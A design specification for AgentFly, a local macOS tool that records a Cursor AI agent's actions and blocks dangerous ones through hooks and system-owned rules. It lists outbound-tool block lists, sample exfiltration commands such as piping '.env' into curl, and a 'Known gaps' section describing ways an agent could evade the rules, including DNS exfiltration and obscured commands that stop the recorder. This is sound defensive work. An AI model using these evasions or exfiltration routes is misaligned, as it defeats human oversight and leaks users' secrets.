# AgentFly for AI coding agents: specification (v1)

Written in plain language on purpose. If a sentence needs a developer to
explain it, that sentence is a bug in this document. Words in *italics* are
explained in the glossary at the end (section 13).

---

## 0. Status

This is the **v1 target**. It describes what AgentFly will be when the v1 cards
are done, not what the code does today. The code is still the hackathon
version and moves toward this document card by card. Where the two differ, this
document wins for new work; the cards say which part of the code changes when.

The hackathon version of this document is kept in
`docs/archive/SPEC-hackathon.md`. HOOKS.md and README.md still describe the
code as it is today.

Sections 7, 8 and 11 are technical reference for the people building it; the
rest is written for the owner.

Two kinds of marker appear below:

- **Pending D16** marks the one open question: memory across sessions (goal 4,
  section 12). The spikes S3 and S5 are done and their results are written into
  the sections they affect.
- Numbers like (D5) point to the owner's decisions in `docs/DECISIONS.md`.

---

## 1. The idea in one paragraph

An AI agent in Cursor can read your files, run commands and call tools, all by
itself. Without help you cannot easily see what it did, in what order, or stop
it from doing something dangerous.

**AgentFly** watches every action that Cursor reports about the agent, in every
project on your machine, and draws it live as a trail. It also has **rules**.
When the agent is about to do something dangerous, a rule stops it (or warns
you), and the message says *which rule* and why.

Like the black box on an aeroplane: it records, and it can also say "no".

Pitch sentence: **"See what your AI agent is doing, and stop the next step
before it does something you would regret."**

Honest limit, said once: it stops the *next* step. When the agent reads a
secret file, that text has already gone to the AI model. This tool cannot undo
that. It can stop the secret from being sent anywhere else.

---

## 2. Goals and hard constraints

Goals, in priority order:

1. **Install once, protected everywhere.** `brew install`, one setup command,
   start. Then any project opened in Cursor is watched and protected, with no
   cloning of AgentFly and no per-project setup. Upgrade and uninstall are
   clean, and uninstall removes the hooks.
2. **Rules you can change easily.** Rules live in a file, not in Python. Three
   outcomes: block, warn, highlight. You see every change and approve it
   before it takes effect.
3. **A UI you enjoy looking at.** It shows the live trail, why something was
   blocked or flagged, and past sessions, and stays readable in long sessions.
4. **Memory across sessions (experiment only).** The first question is whether
   it is feasible and useful, not building it. See section 12.

Hard constraints (non-negotiable):

- **The watched agent cannot edit, disable or weaken its own rules.** The
  wording the owner approved (D1): **prevented for config and rules; detected
  for tampering with installed code.** Section 10 says what that covers.
- **No secrets or file contents are stored.** Anything beyond what section 4
  lists needs the owner's explicit decision.
- **Blocking decisions are fast and local.** They use memory only and never wait
  for the network or a database.
- **Everything runs locally on your machine.** Anything that leaves it (the
  optional Neo4j copy, section 3) is off by default and your own choice.

Out of scope for v1: teams, central dashboards, cloud sync, SSO; agents other
than Cursor (the design leaves room for Claude Code later, D18); Linux and
Windows.

---

## 3. How it works

```
Cursor agent → hook client → recorder service → page on screen
   (acts)      (Cursor calls   (decides allow,    (live trail, past
               it before each   block or warn;     sessions, rules)
               action)          saves a copy)
```

**Hook client.** A hook is a small program Cursor runs *before* the agent does
something. Cursor hands it a description of the action; it answers "allow",
"deny" or "ask". AgentFly's hook client is one small file, `agentfly-hook`,
using only what ships with Python (D5, D18). It runs on a Python that AgentFly
installs for itself (a relocatable standalone build, owned by the system, not
your user), never on your own Python. It strips the action down to safe facts,
asks the recorder, and prints the answer. If the recorder does not answer, or
answers with a 401 or 403, or the input cannot be read, it applies the offline
guard (section 9). It always posts to `127.0.0.1:8787`: there is no port file
and no environment variable it reads (D25). A port kept in a file the agent can
write would let the agent point the client at its own server that always
answers "allow". If a configurable port is ever needed, it goes in the
system-owned config, not in `~/.config`. Details in section 8.

**System hooks file.** `agentfly init -g` writes the hook entries once into
Cursor's system-wide file, `/Library/Application Support/Cursor/hooks.json`,
owned by the system user (root). Every project you open in Cursor uses it, so
there is no per-project setup, and the agent cannot edit it without your
password (D2). The hook client and its Python live in
`/Library/Application Support/AgentFly/`, also system-owned. It lists only
events that the installed Cursor version is known to accept; when the version
or an event is unknown, `init -g` writes nothing and says so (D23, section 8).

**Recorder service.** A small program on your machine, `agentfly serve`, that
listens on `127.0.0.1:8787` only. It receives each action, checks the rules and
answers in a fraction of a second, using notes kept in memory. The macOS
service manager (launchd) keeps it running and restarts it if it stops: through
`brew services` for a Homebrew install, and through a LaunchAgent AgentFly
writes itself for `uv tool` and `pipx` installs (D8). Both set `KeepAlive`
(D4). Commands: `agentfly start`, `stop`, `status`.

**Rules.** The active rules are one file, owned by the system and readable by
everyone, so the agent cannot change it (D3). A small fixed set of rule *kinds*
is written in Python; the file only fills in their parameters and lists (D10).
Rule R0, which protects AgentFly itself, is in code and no file can switch it
off. Section 5.

**Local store.** After the recorder has answered, it saves a cleaned copy of
the step in the background into a SQLite database on your machine (D14). That
store feeds the History tab. Saving never delays the answer. **Neo4j is an
optional extra copy, off by default**; if you turn it on, the same cleaned
steps are also written there, using a login file only you can read. Neo4j
receives steps only when `~/.config/agentfly/config.toml` says `neo4j = true`;
a login file that is merely present does not turn it on (D14). Steps older than
28 days are deleted. `agentfly wipe` deletes the saved sessions and steps from
the local store now. It never clears the "secret was read" marks (section 5),
and the Neo4j copy is removed only by the store's own `--clear`.

**The page.** A web page served by the recorder at `http://localhost:8787`,
a read-only view. The live trail reads the recorder's memory (so it works
without any database); past sessions come from the local store. Section 6.

**Where files live (D7).** Config (token, `config.toml`, rule drafts, the
optional `neo4j.env`, mode 600): `~/.config/agentfly/`. Data (session notes, the store,
logs): `~/.local/share/agentfly/`. System-owned parts (hooks file, hook client,
bundled Python, active rules): `/Library/Application Support/AgentFly/`. The
hackathon folder `~/.config/flightrecorder` is migrated once, by the recorder's
first start (so `agentfly serve` and `init -g` both find it moved).

---

## 4. What is stored and how commands are cleaned

Only *facts about actions*. Never the contents of files.

| Thing | What we store | Example |
|---|---|---|
| Session | id (Cursor's conversation id), start time, end time (when Cursor reports it), **workspace root path** | one Cursor chat |
| Step | order number, time, kind (read / shell / edit / tool), tool name (tool calls only), verdict | "Step 4, shell, blocked" |
| File | path (relative to the workspace), sensitive yes/no | `.env`, sensitive |
| Command | cleaned command (see below) | `curl -d <arg> ntfy.sh` |
| Host | website name only | `ntfy.sh` |
| Rule | id, short description | R1 |

Compared with the hackathon version, v1 adds the workspace root path (the one
item D14 asked the owner to approve), a session end time, and the *highlighted*
verdict below. The workspace path lets History tell projects apart once AgentFly
watches every project. It is stored in the local store, and also in Neo4j if you
turn that copy on.

Verdict can be: allowed, blocked, warned or highlighted (allowed, with a mark
in the page). The *Why* card (section 6) shows the message that was sent for a
block or warn; the message is the rule's own text, which is not a secret.

Connections: a session has steps; each step is followed by the next; a step
points to the file, command or host it touched; a flagged step points to the
rule that flagged it. A step is identified by session id plus its order
number, so saving twice never makes duplicates.

Every action is a new Step. Things such as `README.md` are shared: if the agent
reads the same file three times you see three steps pointing at one
`README.md`.

**Never stored:** file contents, secret values, tool inputs, edit text, command
output, agent replies. The full, uncleaned action lives only in memory while the
decision is made, and is then thrown away. Nothing prints request bodies in a
log.

### How commands are cleaned before saving (strict, and tested)

A command can hide secrets: passwords in `-u user:pass`, tokens in
`Authorization:` headers, keys set in front of a command (`API_KEY=abc cmd`),
even a secret packed into a web address. So we keep almost nothing:

1. Split the command at `|`, `&&`, `||` and `;`.
2. For each part keep only: the program name, option names without their values
   (like `-H`, `-d`; a value stuck onto its option, as in `-uadmin:pw` or
   `-pSECRET`, is a value and is dropped too), and file paths inside the
   workspace (relative).
3. Replace everything else with `<arg>`. A variable set in front of a command
   is saved as `NAME=<removed>`.
4. If the command cannot be split cleanly (an unbalanced quote, `$(...)`,
   backticks, or an inline text block such as `<<EOF`), keep only the program
   name and the word `<unparsed>`. Ordinary balanced quotes are fine and are
   handled by the steps above.
5. For a web address, keep only the website name. Drop the user, password, path
   and query. If a piece of the website name is very long or looks encoded,
   keep only the last two parts (like `evil.com`).
6. For tool calls keep only the tool name, never its inputs. For edits keep the
   path only, never the text.

Cleaning is on by default. The cleaner is as strict as above even where the
rule check (section 5) treats a command more kindly, for example a quoted
heredoc. Test case: `curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1`
is saved as `curl -H <arg> x.com`.

**Important, from the Cursor docs:** the `beforeReadFile` input contains the
file's **contents**. The hook client throws the contents away before anything is
sent to the recorder or written to a log (section 8).

---

## 5. Rules

A rule has an id, a severity, a message and a small check: a named function that
looks at the action and the session and answers yes or no. There is no
expression language. Adding a rule means adding an entry to the rules file; a
new *kind* of rule is Python.

### Severities (D11)

| Severity | What Cursor does | What you see |
|---|---|---|
| **block** | The action is denied. The rule text is in both messages, the one for you and the one for the agent. Cursor cannot override it. | Red in the page, with the *Why* card |
| **warn** | On a shell command, Cursor pauses and asks you (Skip, Always Run, Run). On every other event the action is allowed and marked. | Purple in the page |
| **highlight** | The action is allowed. | A mark in the page only |

Two facts behind the table: an allow with a message shows nothing in Cursor
(so warn and highlight on non-shell events are visible in AgentFly's page
only), and "Always Run" lets you turn a warned command into a standing
allowance inside Cursor. Block is not affected by it. The `ask` answer was seen
in one Cursor mode ("Auto-review with Sandbox"); repeat that check in the mode
you actually use.

### Rule file (D10)

Rules are written in TOML, read with Python's built-in `tomllib`. A small fixed
set of kinds, for example:

- `match`: an event plus a class of file, command or host;
- `after_then`: once X has happened in this session, Y gets this severity.
  "Block `npm publish` after reading `.env`" is one `after_then`.

Each kind is one named pure check; the file fills in parameters and named lists
(sensitive file names, outbound tools, local hosts). Each rule carries inline
tests. A `count` kind can come later.

Spike S3 tried ten of the owner's real rules on these two kinds. Seven fit as
they were. The other three needed small additions, and the owner approved those
instead of a third kind. Each is one named pure check in Python:

- `command` patterns also match flag variants: a trailing `*` (`--data*`),
  `=` forms, and clustered short flags (`-sd`, `-d@f`), through the normaliser;
- `path_scope = "outside_workspace"` on `match` and on the trigger tables,
  worked out from the workspace folders Cursor reports and the resolved path
  (symlinks and `..` are the engine's job);
- `pipe_into = <list>` on `match`: true when a command in the line feeds a
  program in the list (covers `| sh`, `sh -c "$(curl …)"`, `bash <(curl …)`).

"After reading `.env`" means the whole `.env` family, as in the sensitive-file
list below. The field names beyond these are fixed when the rules card is built.

### R0: protect AgentFly itself (in code only)

Blocked always, even before any secret is read, and no rules file can remove or
weaken it:

- touching AgentFly's config, data and system folders, any `hooks.json` (user,
  system or project), the rules file or the token;
- commands that stop, unload or remove the recorder (`kill`, `pkill`,
  `launchctl`, `agentfly stop` and `agentfly uninstall`, `brew services`) or
  that name its port;
- `agentfly serve` (a second recorder once rotated the token) and
  `agentfly wipe` (deleting the history is for you, not the agent);
- a Write or edit whose target path is one of those guard paths.

R0 sees commands after the normalisation below, case-folded, and also checks
the raw text, so a command that cannot be parsed cannot hide a guard name.
The exact guard list is fixed when the R0 card is built.

### R1: secret, then network

**What counts as a sensitive file** (decided by the file's *name only*):
- any file named `.env` or starting with `.env.` (for example `.env.local`),
  **except** ones ending in `.example`, `.sample` or `.template`;
- any file ending in `.pem` or `.key`;
- any file whose name starts with `id_rsa` (but not `.pub`) or `credentials`.

These lists move into the rules file (G2); their exact field names are fixed
when the rules card is built.

**Marking a session** ("has seen a secret"):
- when the file-read tool opens a sensitive file; or
- when *any word* in a shell command names a sensitive file (so `cat .env`,
  `grep KEY .env`, `source .env`, `cp .env /tmp` all count). Marking too often
  is harmless.

**Scope of the mark.** It belongs to one chat (Cursor's conversation id). A
secret read in one chat does not affect another, except for the chat's own
subagents (below). It is saved to a small file so
that a restart of the recorder does not forget it, and it clears only when a
new chat starts.

**Subagents (D21, D9).** When the agent starts a helper (a subagent), Cursor
gives it its own chat id. Spike S5 found that every event inside a subagent
still carries `parent_tool_call_id`, which equals the id of the parent chat's
`Task` call. So the mark follows that id in both directions: a subagent of a
marked chat is marked, and a mark set inside a subagent also marks its parent.
Without that, a send handed to a subagent could slip past the mark. The
`subagentStart` event is registered too, record-only, as a second source of the
same link. Nothing depends on `subagentStop`: a background subagent never fires
it. As a fallback for a Cursor version that drops the field: if a marked chat
starts a `Task` and no event with that id ever arrives, new chats in the same
workspace inherit the mark for 30 minutes.

**Command normalisation.** Before any rule looks at a shell command, it is
normalised: `bash -c`, `sh -c`, `env` and `sudo` are unwrapped, `$(…)` and
backticks are looked into, and paths are case-folded. This applies to every
rule, R1 included (D10). It is new work: today's command cleaner unwraps nothing.

**Blocking.** Once a session is marked, any command that sends data to another
computer is blocked. After normalisation that covers:
- `curl`, `wget`, `nc`, `scp`, `ssh`, `rsync`, `git push`, `gh`, `aws`;
- an inline-code one-liner (`python -c`, `node -e` and similar), **whether or
  not it mentions "http"**;
- a command that cannot be parsed (an unbalanced quote, or a `<<EOF` block);
- the same tools inside a wrapper.

One exception keeps normal work possible: the body of a *quoted-delimiter*
heredoc (`<<'EOF'`) is treated as plain text, so
`git commit -m "$(cat <<'EOF' … EOF)"` and `tee f <<'EOF'` are parsed and not
blocked. The exception does not apply when the program that reads the heredoc
is a shell or an interpreter: `sh`, `bash`, `zsh`, `python`, `python3` (also
versioned names such as `python3.12`), `node`, `ruby` and `perl`, also when
wrapped in `env`, `sudo` or `xargs`. There the body is code that runs, so
`bash <<'EOF' … EOF` and `python3 - <<'EOF' … EOF` count as outbound after a
secret read. Every other unparseable command counts as outbound too. The cost,
accepted by the owner: a commit message written with an unquoted `<<EOF` is
blocked in a marked session, so the agent must commit another way (for example
`git commit -F file`) or you start a new chat.

**Order matters:** if one command both reads a secret and sends it
(`cat .env | curl -d @- host`), the marking happens first and the block
applies to the same command.

**Not blocked:** sending to your own computer (`localhost`, `127.0.0.1`, and
addresses inside your own network). Otherwise `curl localhost:8000/health`
would be blocked. This is a known hole: a tunnel could bypass it.

### The mark is not the only rule

R1 and R0 are the two rules v1 must have. Further rules (for example a warn on
`rm -rf` or `git push --force`, or on writes outside the workspace) are
ordinary entries in the rules file once the kinds are fixed.

### How a rule changes (D3, D12)

Nothing on the web port can change a rule (section 11). The flow is entirely in
the command line:

1. **Draft.** `agentfly rules draft` writes a draft file in your user folder.
   A draft the agent writes does nothing until you approve it.
2. **Check.** `agentfly rules check`: the schema, unknown fields, over-broad
   globs.
3. **Diff.** What changes, with *loosening* changes in red: a removed rule, a
   lower severity, a shorter list, a new exception.
4. **Backtest.** "Would have changed N decisions in M sessions" over your
   stored sessions.
5. **Approve.** `sudo agentfly rules apply <draft>` asks for your password,
   installs the rules into the system-owned file, and the recorder reloads. Your
   password is the secret the agent does not have.

No shadow period and no signed rule sets: the system-owned file does the
signing's job. To trial a rule safely, add it as `highlight` first.

### Drafting in plain language (D13)

Not in v1. `agentfly rules draft` fills in a rule kind, its lists and a
severity from command-line flags, and writes a draft file. There is no form in
the page. Spike S3 showed that a model can draft the rules that fit the kinds
accurately, but also that it can silently write a wrong rule that looks right,
so every draft is reviewed with its inline tests and the backtest. Once the
rules card is done, S3's ten sentences are tried again on the candidate models
before plain language is added; any cloud model needs the owner's approval
again. A model would only draft; it is never in the decision path, and it would
see your sentence and the rule schema, never session data.

---

## 6. The screen

The page is a read-only view (D15, confirmed by spike S4). It is **decision
first**:

- **Live Trail** is the home view. Every step has a badge (allowed, blocked,
  warned, highlighted). Routine runs of allowed steps are grouped, blocks and
  warnings are pinned, and a Follow button keeps the newest step in view.
  Repeated identical blocks stay as separate rows.
- **The Why card.** Every block opens a card that shows the rule, the
  trigger step and the blocked step, and the exact messages that were sent.
  The red box with a dashed line to the rule is the moment the page must
  carry. Because the page cannot change anything, the card shows the
  `agentfly rules …` command to run, not an "allow once" button. The owner
  asked that the card can be hidden and resized; how is decided in the UI card.
- **Health strip.** Shows the recorder's status, and a big red **OFFLINE**
  banner appears when the page cannot reach the recorder, so a dead recorder
  never fails silently.
- **Tabs.** History (past sessions, from the local store, by workspace), Rules
  (the active rules, read-only), and Graph (today's lane graph). The lane graph
  moves to its tab only after the owner has seen the trail working on live
  steps.
- **Half-screen first.** The page is mostly used on half of the screen (about
  700 pixels wide), so that is the main layout, not a fallback.
- The live trail refreshes about once a second. No chat view: the page never
  shows file contents or agent replies, because none are stored.

---

## 7. Install, run, uninstall

Macs only in v1. Target flow:

```
brew install volkovyy-00/tap/agentfly      # or: uv tool install agentfly-recorder
agentfly init -g                           # one sudo password prompt
agentfly start
```

Then open any project in Cursor. It is watched and protected with no
per-project setup. (A per-project `agentfly init` is deferred; section 12.)

- **Distribution (D6).** A Homebrew formula in the owner's own tap, and the same
  wheel (with the built page inside) on PyPI under the name
  **`agentfly-recorder`**, for `uv tool` and `pipx`. The Python import package
  and the commands stay `agentfly` and `agentfly-hook`. The CLI uses Python's
  built-in `argparse`, one module per command. The build backend is hatchling.
- **Known name clash.** An unrelated PyPI project named `agentfly` also claims
  an `agentfly` command, and the two cannot share one environment. Which one
  wins on `PATH` depends on install order. `agentfly doctor` checks that the
  `agentfly` on `PATH` is ours.
- **`init -g`** writes the system hooks file, installs the hook client and its
  bundled Python, and sets up the system-owned rules file, with one `sudo`
  (D1, D2, D5). It writes only events from a known list for the installed
  Cursor version, and writes nothing when the version or an event is unknown
  (D23). The move from `~/.config/flightrecorder` (D7) has already happened at the
  recorder's first start; `init -g` relies on it. Running
  it twice changes nothing; entries of other tools in the hooks file are left
  as they are. In v1, remove AgentFly's own repo-level `.cursor/hooks.json`, or
  every event arrives twice.
- **Run (D8).** `agentfly start`, `stop` and `status` use `brew services` for a
  Homebrew install and AgentFly's own LaunchAgent otherwise. `agentfly serve`
  runs the recorder in the foreground, which is how developers run it.
- **`agentfly doctor`** checks everything installed: the hooks file and hook
  client are intact and match their recorded hashes (D1), the bundled Python is
  not writable by your user (D5), `KeepAlive` is set (D4), and `agentfly` on
  `PATH` is ours. It also compares the registered events with the known list,
  and reads Cursor's Hooks log for "Invalid … config" or "Failed to parse"
  lines about AgentFly's file; either finding is a failure, not a warning
  (D23). A missing hook client file turns it red (D5). It warns when
  `~/.claude/settings.json` holds hooks on a gate event (D24, section 8).
- **Uninstall (D8).** Run `agentfly uninstall` *before* `brew uninstall`:
  Homebrew leaves the service file behind. Uninstall removes AgentFly's hook
  entries and the service. Only after that does the hook client stop guarding. If
  you run `brew uninstall` first, the system-owned hook client stays behind,
  keeps denying outbound commands, and tells you to run `agentfly start`, which no
  longer exists; remove the entries by hand or reinstall and uninstall properly.
- **Publishing.** Pushing to PyPI or a Homebrew tap is outward-facing; the owner
  approves each release, and the PyPI name is re-checked first.
- **Developers** can still run the recorder from a clone; AGENTS.md has the
  commands. Until the packaging card lands, that is the only way.

---

## 8. Hooks and the hook client

### Events (D9)

The registered events are:

| Kind | Events |
|---|---|
| Gates (can deny) | `beforeShellExecution`, `beforeReadFile`, `beforeMCPExecution`, `preToolUse` |
| Record only | `afterFileEdit` (edit text dropped), `sessionStart`, `sessionEnd`, `subagentStart` (its only job is the parent link, section 5) |
| Never registered | `beforeSubmitPrompt`, `afterAgentResponse`, `afterAgentThought` (they carry prompts and replies) |

`preToolUse` is the only gate for the agent's Write and Grep tools, so it is
needed. `afterShellExecution` is registered only if the memory experiment goes
ahead, and then only its exit code is kept.

**Only events Cursor accepts (D23).** Spike S5 (Cursor 3.24.12) confirmed that
one unknown event name makes Cursor reject the whole hooks file, with an error
only in its Hooks log, and then no AgentFly hook runs. So `init -g` writes only
events on a known list for the installed Cursor version, and `doctor` checks
the registered events against that list and reads the Hooks log (section 7). A
Cursor update that drops an event is caught by `doctor`, not prevented. MCP
events are untested.

**Where hooks come from (D24).** Cursor runs hooks from several places side by
side: the system file, the user and project `hooks.json`, and also
`~/.claude/settings.json`, which the agent can write. In spike S2 an allow-all
shell hook in the user or project `hooks.json` did not cancel AgentFly's deny.
No spike tested `~/.claude/settings.json` that way, and how Cursor combines an
allow from any other source with AgentFly's deny on the other events is
untested. `doctor` warns when
`~/.claude/settings.json` holds hooks on a gate event; that becomes a failure
if an allow turns out to override.

### The hook client (D5, D18)

- Called as `agentfly-hook <agent> <event>`. Only `cursor` is built; a small
  step turns Cursor's input into AgentFly's own shape. An unknown agent gets
  "allow", exit 0 and a warning on stderr.
- One file, standard library only, run with `python -I -S` on the bundled Python.
  Target: 95 % of calls under 50 milliseconds. It never starts the full command
  line program. The packaging card (V3a) re-measures the target on the bundled
  Python.
- It **always prints valid JSON and exits 0**. Exit code 2 would block the
  action, so every path is wrapped. Stdout holds only the JSON answer; all
  logging goes to stderr.
- The path to the client in `hooks.json` is quoted (an unquoted path with a
  space made Python exit 2, and Cursor denied every action).
- It sends the token in a header and uses `conversation_id` as the session key.
  Subagent events keep their `parent_tool_call_id` (section 5).
- It always posts to port 8787 and reads no port file or environment variable
  (D25). Tests set the client's port inside their own harness.
- Each hook entry has an explicit timeout. The wait for the recorder is half a
  second (0.5 s).

### Stripping, before anything else

The client throws away content before it logs or sends:

- `content` of `beforeReadFile`;
- `edits` of `afterFileEdit`;
- `output` of `afterShellExecution`;
- the contents of `tool_input`. From it the client keeps only the target path of
  file tools (`file_path` for Read, Write and Grep; never `content`, `pattern`
  or `command`), so R0 can still deny a Write to a guard file. For MCP calls it
  keeps only the server and tool names.

### Duplicates

`preToolUse` and the specific gates can both fire for one action. When they
carry the same `tool_use_id` they make one step. Spike S1 saw `tool_use_id` only
on `preToolUse` and `beforeShellExecution` (Cursor's own docs list it for
`preToolUse`, not for shell events), so only shell and tool calls can be merged
this way. **Open:** a file read fires both `preToolUse` and `beforeReadFile`, and
`beforeReadFile` has no `tool_use_id`, so reads would show twice. Spike S5
found no field that links the two (`generation_id` is one value for a whole
turn). The merge key is proposed in the hook-client card and goes to the owner.

### The answers

- **Block:** `{"permission":"deny","user_message":"…","agent_message":"…"}`. The
  rule text goes in both messages (where the event accepts both), because one of
  them has been reported ignored in some Cursor versions. `agent_message` adds: "Do not retry with another tool
  or language. Stop and tell the user."
- **Warn on a shell command:** `{"permission":"ask","user_message":"…"}`.
- **Allow, warn on other events, and highlight:** plain allow; the page carries
  the mark.

---

## 9. When the recorder is down

Cursor must never be left without protection just because the recorder was
stopped (D4). If the recorder does not answer in time, or answers with a 401 or
403 (the wrong token), or the client cannot read its own input, the hook client
applies the **offline guard**, a fixed, simple subset of the rules. A wrong
token is never treated as an allow.

- it **denies** outbound commands: `curl`, `wget`, `nc`, `scp`, `ssh`,
  `rsync`, `git push`, `gh`, `aws`, every inline `python -c` / `node -e`
  one-liner (whatever it contains), and the same commands wrapped in `bash -c`,
  `env` or `sudo`. Sending to your own computer (`localhost`, private
  addresses) is allowed;
- it **denies** commands that touch AgentFly's guard paths (R0), and any Read, Write
  or Edit (every file tool, `StrReplace` and `Delete` included) whose target is a
  guard path: the `file_path` of a read, an attachment or a tool's input, with case,
  `~`, `//`, `/./` and `..` resolved (D4);
- it **allows** everything else and writes down that it did so. Cursor shows
  nothing for an allow with a message (S1), so the visible signals are the
  health strip and the log, not a message in the chat;
- a command it cannot parse is denied only if its raw text names one of those
  tools;
- every deny message tells you to run `agentfly start`.

The guard is a simpler, word-level copy of the real normalisation, tested against
the same cases.

**The accepted cost:** whenever the recorder is down (not started, crashed or
killed), in every project and even with no secret read, the agent cannot run
those commands. launchd `KeepAlive` restarts a recorder that was killed, so this should be
brief; it does not help when the service was deliberately stopped (`agentfly
stop`, `brew services stop`), which is why R0 blocks those commands. While the
recorder is down your own rules do not run, only the fixed subset above.

**A missing client file is a loud failure, not the offline guard (D5).** If
AgentFly is registered but its hook client file is missing or broken, no client
runs and so no guard can: Python exits with code 2 and Cursor blocks every
action (this happened in spike S2 with an unquoted path). That is loud rather
than silent, and `doctor` turns red. The offline guard covers only a recorder
that is down. A plain "allow" is answered only after `agentfly uninstall` has
removed the registration.

Not built in v1 (a possible v1.1): a per-chat marker kept by the hook client
itself, so a mark survives a recorder outage.

---

## 10. Protecting AgentFly itself

The agent runs as your macOS user, so by default it could try to switch AgentFly
off. The promise (D1) is **prevented for config and rules; detected for
tampering with installed code.**

**Prevented** (the agent cannot do it without your password):
- editing the hooks registration, the hook client, the bundled Python, or the
  active rules: all are owned by the system user (D2, D3, D5). In the S2 test,
  both the edit tool and a Python one-liner got "Permission denied", and `sudo`
  asked for a password.
- A rule change needs `sudo` (section 5). This costs one password at install and
  one per rule change.

**Detected** (the agent might manage it, but it will be noticed): patching
AgentFly's own installed code under the Homebrew folder, which your user can
write to. `agentfly doctor` and each session start compare file hashes with the
ones recorded at install, and a mismatch raises a red banner.

**Your `sudo` does not reach the agent (D3).** Spike S2 could not tell whether a
`sudo` password entered in your own Terminal could be reused from the agent's
terminal, so S5 re-ran the check. After the owner ran `sudo -v` in Terminal,
`sudo -n true` in the agent's shell failed with "a password is required" (exit
1). The rule-change flow therefore stands.

**The sandbox is not a control (D22).** Decisions never depend on Cursor's
`sandbox` field; it is only recorded. A command AgentFly denies is denied
whether it runs inside Cursor's sandbox or outside it. The agent can leave the
sandbox on its own: in S5, after `sudo` failed inside the sandbox, the agent
re-ran it outside and Cursor asked nothing.

Other measures:
- The recorder listens on `127.0.0.1` only, never on the network.
- A random token, in a file only your user can read, goes with every hook
  request (`POST /hook`). Requests without it are rejected, and hook requests
  must be JSON. Every request, including the page's, must carry the host name
  `localhost:8787` or `127.0.0.1:8787`. The page itself and its read-only data
  need no token, because a page in a browser cannot keep one secret and can only
  read.
- The token does not stop the agent, since it runs as you, so R0 blocks reading
  it. With the token a forged `POST /hook` could add fake steps or mark a
  session. That can only make AgentFly stricter or noisier, never looser; the
  owner accepts it.
- Nothing on the port can loosen anything (section 11).
- The optional Neo4j login is a file in `~/.config/agentfly/`, read only by the
  recorder, never in the terminal's environment, never given to the hook client.
- The page never sends database questions. The recorder has a small fixed set of
  named read-only queries; values are passed as parameters, never pasted into
  the query, with a time limit.

**Known gaps, said openly:**
- R1 matches names. A determined agent can hide a read (`cat .en*`), copy a
  secret into a normal file and send it from a new chat, send data inside DNS
  lookups, tunnel through a local address, or use Cursor's own web tools (which
  may not pass through the hooks). This is a first layer, not a sandbox.
- Cursor Cloud Agents are not covered by a local hooks file.
- Cursor's own sandbox proxy may stop a command before AgentFly sees it, and the
  agent may re-run it outside the sandbox on its own, which AgentFly does see.
  The sandbox is not relied on for anything (above).
- Cursor also runs hooks from `~/.claude/settings.json`, a file the agent can
  write. How an allow from there combines with AgentFly's deny is untested
  (section 8).
- "Always Run" on a warned shell command removes that warning (section 5).
- The agent can read the token (above).
- R0 matches names, so a deliberately obscured command can still reach
  `agentfly stop`, `brew services stop` or the session-notes file. Stopping the
  recorder this way means your own rules stop running (only the offline subset
  applies, section 9), and deleting the session notes makes marks forgotten.
  The result is detected by `doctor` and the health strip, not prevented.
- The hash check is run by AgentFly's own code, so code that has been tampered
  with could hide the tampering. Where the recorded hashes live and what checks
  them is for the install card to decide.
- "Write a script file, then run it" is not caught: only inline one-liners and
  heredocs fed to the shells and interpreters listed in section 5 count.

---

## 11. Recorder API

The recorder on port 8787 serves exactly two kinds of route (D19):

| Route | What it does |
|---|---|
| `POST /hook` | The hook client's request. Token, JSON body and an allowed host name required. |
| `GET /` and `GET /assets/*` | The page. |
| `GET /health` | Recorder status, for the health strip and `doctor`. |
| `GET /api/steps` | Live steps from memory. |
| `GET /api/sessions` and `GET /api/sessions/{id}/steps` | Past sessions, from the local store. |
| `GET /api/rules` | The active rules, read-only. |

There is **no** endpoint that edits, adds or removes rules, allows an action
once, adds an exception, resets a session's "secret was read" mark, or deletes
data. Those happen only on the command line: rule changes through
`sudo agentfly rules apply`, deletion through `agentfly wipe` (which keeps the
marks), and a mark clears only with a new chat. FastAPI's own `/docs`, `/redoc` and `/openapi.json` are
switched off.

A test lists every `(method, path)` the app serves against this whitelist and
fails on anything else, including any method other than GET apart from
`POST /hook`. HEAD on an API route answers 405. Every card that adds a route
adds its line to the whitelist.

---

## 12. Not in v1, and still pending

- **Plain-language drafting** (D13): not in v1; drafts come from flags
  (section 5).
- **Memory across sessions** (D16, goal 4): **Pending D16.** Experiments only,
  and the answer to "does it help" is a yes, partly or no with one small test.
  One idea is an option on R1 where a secret read in this workspace in the last
  24 hours still counts, loaded into memory at start and never queried live.
  Another is a short brief given to the agent at session start. Spike S5 was a
  smoke test of that brief (two chats per arm): it reached the agent, which
  used it. That says nothing about value; it only unlocks the pre-registered
  A/B test. D16 is still proposed; as proposed, neither is a v1 feature.
- **A per-project `agentfly init`** (D20): deferred. The global install already
  covers every project. If you later want only some projects watched, a
  system-owned watch list is the safe shape and needs no change to the hooks.
- **Other agents** (D18): the hook client takes an agent name now, but only
  Cursor is built. Claude Code may come later; if both are installed, events are
  de-duplicated by `cursor_version`.
- **Linux and Windows.** Paths follow XDG, which keeps Linux cheap later.
- **Publishing** the Homebrew tap and the PyPI package: needs the owner's
  approval per release.
- **Not built:** a shadow period and signed rule sets; a rule form or draft
  download in the page; a chat view, run diff and replay scrubber; Neo4j as a
  requirement; Cursor Cloud Agents.

---

## 13. Glossary

- **Agent:** the AI in Cursor that can act on its own.
- **Hook:** a small program Cursor runs before an action.
- **Hook client:** AgentFly's hook program, `agentfly-hook`.
- **Recorder:** the small program on your machine that receives the hook
  messages, decides and keeps the notes.
- **localhost:** "this machine". A page at localhost is not on the internet.
- **Session:** one chat with the agent.
- **Subagent:** a helper the agent starts for a part of the job. Cursor gives it
  its own chat id; its events point back to the parent through
  `parent_tool_call_id`.
- **Hooks log:** the log in Cursor where it reports a hooks file it could not
  load.
- **Step:** one action the agent took.
- **Workspace:** the project folder open in Cursor.
- **Rule:** a written condition that decides allow, warn or block.
- **Rule kind:** a fixed type of rule written in Python (for example
  `after_then`); the rules file fills in its parameters.
- **Sensitive file:** a file likely to hold passwords or keys.
- **Mark:** a note on a session: "a secret was read here".
- **Offline guard:** the small fixed set of rules the hook client applies when
  the recorder does not answer.
- **System-owned (root-owned):** a file your user, and so the agent, cannot
  change without your password.
- **sudo:** the macOS command that asks for your password to act as the system
  user.
- **launchd / KeepAlive:** the macOS service manager, and its setting that
  restarts a program when it stops.
- **SQLite:** a small database stored in one file; the default local store.
- **Neo4j:** a graph database; an optional extra copy in v1.
- **curl / wget / nc / scp:** programs that send or fetch data over a network.
